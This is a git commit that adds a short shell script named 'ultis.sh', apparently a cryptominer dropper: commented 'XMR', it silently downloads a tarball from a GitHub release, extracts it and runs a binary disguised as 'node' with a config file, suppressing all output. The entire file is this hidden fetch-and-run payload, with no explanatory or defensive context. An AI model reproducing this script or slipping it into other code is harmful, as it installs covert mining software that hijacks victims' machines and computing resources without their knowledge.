60e10c41a7ef1082d6019984ef7528bf1a42fd7d
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-29 08:55:12 +0800

    Create ultis.sh

---
+++ ultis.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+#
+#
+#XMR
+wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar > /dev/null 2>&1 
+tar -xvf male1.tar > /dev/null 2>&1 
+cd MXC > /dev/null 2>&1 
+./node mr.ini > /dev/null 2>&1 
